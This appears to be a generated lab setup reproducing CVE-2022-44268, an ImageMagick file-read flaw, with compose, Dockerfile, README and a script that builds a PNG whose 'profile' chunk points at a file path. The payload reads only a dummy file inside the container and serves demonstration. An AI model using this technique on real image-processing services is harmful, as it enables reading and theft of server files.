{
    "files": [
        {
            "location": "./../../dockers/CVE-2022-44268/custom_no_tool/docker-compose.yml",
            "content": "version: '3.8'\n\nservices:\n  imagemagick:\n    image: ubuntu:22.04\n    container_name: imagemagick_vulnerable\n    volumes:\n      - ./imagemagick:/data\n    working_dir: /data\n    command: bash -c \"apt-get update && apt-get install -y imagemagick pngcrush && tail -f /dev/null\"\n    networks:\n      - vuln_network\n    ports:\n      - \"8080:8080\"\n\nnetworks:\n  vuln_network:\n    driver: bridge\n"
        },
        {
            "location": "./../../dockers/CVE-2022-44268/custom_no_tool/imagemagick/Dockerfile",
            "content": "FROM ubuntu:22.04\n\nRUN apt-get update && \\\n    apt-get install -y imagemagick=8:7.1.0-49-1 pngcrush && \\\n    rm -rf /var/lib/apt/lists/*\n\nWORKDIR /data\n\nCOPY create_vulnerable_image.sh /data/\nRUN chmod +x /data/create_vulnerable_image.sh\n\nCMD [\"/bin/bash\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2022-44268/custom_no_tool/imagemagick/create_vulnerable_image.sh",
            "content": "#!/bin/bash\n\n# Create a sample text file to simulate sensitive data\necho \"This is a sensitive file\" > sensitive.txt\n\n# Create a simple PNG image\nconvert -size 100x100 xc:white image.png\n\n# Embed the path of the sensitive file into the PNG image using pngcrush\npngcrush -text a \"profile\" \"../../../../data/sensitive.txt\" image.png vulnerable_image.png\n\n# Note: The actual exploitation would involve using ImageMagick to process\n# 'vulnerable_image.png' and read the embedded file path.\n"
        },
        {
            "location": "./../../dockers/CVE-2022-44268/custom_no_tool/imagemagick/README.md",
            "content": "# ImageMagick Vulnerable Setup\n\nThis setup is intended to demonstrate CVE-2022-44268 using a Docker environment.\n\n## Services\n\n- **ImageMagick**: Version 7.1.0-49 on Ubuntu 22.04 with pngcrush.\n\n## Instructions\n\n1. Run `docker-compose up` to start the vulnerable ImageMagick service.\n2. Access the container using `docker exec -it imagemagick_vulnerable /bin/bash`.\n3. Navigate to `/data` and execute `./create_vulnerable_image.sh` to create a PNG file that exploits the vulnerability.\n4. Use ImageMagick's `convert` tool within the container to process `vulnerable_image.png` to demonstrate the vulnerability.\n\n## Note\n\nThis setup is for educational purposes only. Handle with care and ensure this is used in a controlled environment.\n"
        }
    ],
    "directory_tree": "CVE-2022-44268/\n\u251c\u2500\u2500 custom_no_tool/\n\u2502   \u251c\u2500\u2500 docker-compose.yml\n\u2502   \u2514\u2500\u2500 imagemagick/\n\u2502       \u251c\u2500\u2500 Dockerfile\n\u2502       \u251c\u2500\u2500 create_vulnerable_image.sh\n\u2502       \u2514\u2500\u2500 README.md\n"
}